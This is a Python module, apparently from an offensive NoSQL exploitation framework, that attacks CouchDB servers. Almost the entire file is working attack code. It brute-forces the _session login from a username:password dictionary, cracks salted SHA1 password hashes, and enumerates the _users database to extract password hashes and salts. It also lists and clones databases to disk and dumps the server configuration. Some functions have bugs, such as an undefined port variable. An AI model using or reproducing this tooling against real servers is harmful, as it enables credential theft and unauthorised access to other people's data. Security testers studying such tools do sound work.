from __future__ import print_function
from __future__ import absolute_import
# Couch Attack file
import os
import sys
import threading
import socket
import json
from hashlib import sha1
import requests
from termcolor import colored
#import couchpy
#from couchpy.httperror import Unauthorized
import couchdb
from .libs import dump

passfound = ""


def couch_conn(target, port=5984):
    """
    Establishes Connection with CouchDB and Determines whether alive or not and returns the couch object

    """
    try:
        couch = couchdb.Server('http://%s:%d/' % (target, port))
        try:
            check = couch.version()  # Makes sure that the Connection is really established
            return couch
        except couchdb.http.Unauthorized:
            print(colored("\n[-] Couch Basic Auth Detected \n", 'red'))
            print(colored("[-] Try Supplying with Credentials \n", 'red'))
            sys.exit(0)
        return couch
    except socket.error:
        print(colored("[-] CouchDB port closed. \n", 'red'))
        sys.exit()


def dict_couch(file_name, target, port=5984):
    """

    Used to For Dictionary Attack on CouchDB _utils interface protected with password
    Reads from Dictionary of format 'username:password'

    """
    """
	print colored("[-] Dictionary Attack Module For NoSQL Framework Launched ..",'blue')
	url = "http://"+target+":"+str(port)+"/_session"
	try:
		file = open(file_name,"r")
		lines = file.read().split('\n')
		for names in lines:
			if names:
				payload={'name':str(names.split(':')[0]),'password':str(names.split(':')[1])}
				code = requests.post(url,data=payload)
				if code.status_code == 200:
					print colored("[-] Auth Succeeded with username:%s and Password %s"%(names.split(':')[0],names.split(':')[1]),'green')
					break
				else:
					print colored("[-] Auth Failed with username:%s and Password %s"%(names.split(':')[0],names.split(':')[1]),'red')
			else:
				pass
	except Exception,e:
		print colored(str(e),'red')
	"""
    global passfound
    url = "http://" + target + ":" + str(port) + "/_session"
    try:
        open_file = open(file_name, "r")
        lines = open_file.read().split('\n')
        #couch = couchdb.Server('http://%s:%d/'%(target,port))
        for names in lines:
            s1 = names
            t1 = threading.Thread(target=tryandgetpass, args=(url, names))
            t1.start()
            t1.join()
        # print passfound
        if passfound:
            print(colored(passfound, 'green'))
        else:
            print(colored("[-] Password not found in the list \n", 'red'))
            # print passfound
    except Exception as e:
        print(colored(str(e), 'red'))


def tryandgetpass(url, names):
    """
    Checks for username and password, module used for bruteforce
    """
    global passfound
    try:
        if names:
            payload = {'name': str(names.split(
                ':')[0]), 'password': str(names.split(':')[1])}
            code = requests.post(url, data=payload)
            # print code.status_code
            if code.status_code == 200:
                passfound = "[-] Auth Succeeded with username:%s and Password %s" % (
                    names.split(':')[0], names.split(':')[1])
            else:
                print(colored("[-] Auth Failed with username:%s and Password %s" %
                              (names.split(':')[0], names.split(':')[1]), 'red'))
    except couchdb.http.Unauthorized:
        print(colored("[-] Auth Failed with username:%s and Password %s" %
                      (names.split(':')[0], names.split(':')[1]), 'red'))


def hash_cracker(dict_file_name, hash_file_name):
    found = 0
    file_dict = open(dict_file_name, "r")
    passwords = file_dict.read().split('\n')
    file_hash = open(hash_file_name, "r")
    enc_hashes = file_hash.read().split('\n')
    print(enc_hashes)
    for pwd in passwords:
        try:
            for rec in enc_hashes:
                # print pwd.split(':')[1]
                test = sha1(pwd.split(':')[1] + rec.split(':')[1]).hexdigest()
                if pwd.split(':')[1] == 'admin':
                    print(rec.split(':')[0])
                    print(test)
                if test == rec.split(':')[0]:
                    print(colored(
                        "[-] Password Found for password_sha " + rec.split(':')[0] + " : " + pwd))
                    found = 1
                    break
                else:
                    pass
                    if found == 1:
                        break
        except:
            pass


def clone_couch(target, db):
    """
    Clones a Copy of the Database Specified to the Disk for any further hacking.

    """
    if not os.path.exists("dump"):
        os.makedirs("dump")
    elif not os.path.exists("dump/couchdb"):
        os.makedirs("dump/couchdb")
    print(colored("[-] Clone Module For NoSQL Framework Launched ..", 'blue'))
    couch = couch_conn(target)
    for db in couch:
        print(colored("[-]%s" % (db), 'green'))
    print(colored('[-] Enter Database to clone', 'blue'))
    try:
        db_clone = raw_input()
        files = open("./dump/couchdb/" + str(target) +
                     "." + db_clone + ".dump", "w")
        dump.dump_db("http://" + target + ":"+str(port) +
                     "/" + db_clone, output=files)
        files.close()
        print(colored("[-] Cloning Succesfull with DB %s" % db_clone, 'green'))
    except couchdb.http.ResourceNotFound:
        print(colored("[-] Plse Check DB Name '%s' not in List" %
                      db_clone, 'red'))


def couch_enum(couch, target, port=5984, creds="", db_select=False, column_select=False, post_status=True):
    """
    Enumerates Couch Database
    """
    couch = couch_conn(target,port)
    done = False
    further = True
    try:
        if creds:
            username = creds.split(':')[0]
            password = creds.split(':')[1]
            try:
                couch.resource.credentials = (username, password)
                done = True
            except couchdb.http.Unauthorized:
                print(
                    colored("[-] The DB requires Credentials or Wrong Credentials :( \n", 'red'))
                further = False
            # try:
             #   from couchpy.client import Client
             #   couch_client = Client('http://' + target + ':' + str(port))
              #  couch_client.login(username, password)
           # except Exception as e:
            #    print(e)
        print(colored(
            "\n[!] Enumeration Module For NoSQL Framework Couchdb Launched.....", 'yellow'))
        print(colored("\n[+] Couch Version : " + couch.version(), 'green'))
        parse = requests.get("http://" + target + ":" +
                             str(port)+"/_users/_all_docs")
        j = parse.json()
        if 'forbidden' or 'unauthorized' in j.values():
            if len(j['rows']) == 1:
                print(colored("[-] No Users Found !! \n", 'blue'))
                print(colored(
                    "[!] Looks Like We have Admin Party. DO the Hula Bula Dance \n", 'green'))
                # sys.exit(0)
            else:
                print(colored("\n[!] Retrieving Couchdb Users\n", 'blue'))
                for i in range(1, len(j['rows'])):
                    print(colored("[-] " + str(j['rows'][i]['id']), 'green'))
                    print(colored("\t[!] Hashes Obtained", 'green'))
                    det = requests.get(
                        "http://" + target + ":"+str(port)+"/_users/" + str(j['rows'][i]['id']))
                    json_couch = json.loads(det.text)
                    try:
                        print(colored("\t[+] Password Sha:" +
                                      str(json_couch['password_sha']), 'green'))
                        print(colored("\t[+] Salt:" +
                                      str(json_couch['salt']), 'green'))
                    except KeyError:
                        print(colored("\t[+] Password Sha: Nil", 'green'))
                        print(colored("\t[+] Salt: Nil", 'green'))
        elif done != True:
            print(
                colored("\n[-] _users Forbidden Requires Admin Priveleges ", 'red'))
        try:
            print(colored("\n[!] Enumerating DB's \n", 'blue'))
            for db in couch:
                print(colored("\t[+] %s" % (db), 'green'))
                # time.sleep(2)
            if db_select:

                print(
                    colored('\n[!] Enumerating DB "%s" Keys \n' % (db_select), 'blue'))
                try:
                    db = couch[str(db_select)]
                    for i in db:
                        print(colored("\t[-] %s" % (i), 'green'))
                    if column_select:
                        col = db[column_select]
                        print(colored("\n[+] Getting " +
                                      column_select + " info \n", 'blue'))
                        for i in col:
                            if i:
                                print(
                                    colored("\t[+] " + i + ":" + str(col.get(i)), 'green'))
                except couchdb.http.ServerError:
                    print(colored(
                        '[-] Forbidden Only admins can access _all_docs of system databases.', 'red'))
                except couchdb.http.Unauthorized:
                    print(
                        colored("[-] The DB requires Credentials or Wrong Credentials :( \n", 'red'))
                    further = False

            print("\n")
        except couchdb.http.Unauthorized:
            print(
                colored("[-] The DB requires Credentials or Wrong Credentials :( \n", 'red'))
            further = False

    # Enumerates Couch Configuartion
        if further != False and post_status:
            # Parsing needed to be added
            print(
                colored("\n\n[!] Trying to Retrieve CouchDB Configs\n", 'blue'))
            try:
                conf = couch.config()
                for i in conf:
                    print(colored("\t[+] %s" % i, 'magenta'))
                    for j in conf[i]:
                        print(colored("\t\t[+] %s : %s" %
                                      (j, conf[i].get(j)), 'green'))
            except couchdb.http.Unauthorized:
                print(
                    colored("\t[-] Oops Looks Like u need Credentials \n", 'red'))
    # Enumerates For Couch Logs
           # print(colored("\n\n[!] Trying to Fetch the CouchDB Server Logs ", 'blue'))
           # try:
            #    files = open(target + ".couch.log", 'w')
            #    logs = couch_client.log()
            #    files.write(logs)
            #    files.close()
            #    print(colored("\t[+] Log written to " + target + ".couch.log", 'green'))
           # except Exception:
            #    print(colored("\t[-] Oops Looks Like u need Credentials \n", 'red'))
    except couchdb.http.Unauthorized:
        print(
            colored("\t[-] Credentials are wrong or try without Credentials :( \n", 'red'))


"""
def main():
	#hash_cracker('./dictionary/b.txt','./hashes')
	#dict_couch('./dictionary/b.txt','localhost',port=5984)
	couch=couch_conn('')
	couch_enum(couch,'',80,False,False,True)
main()
"""
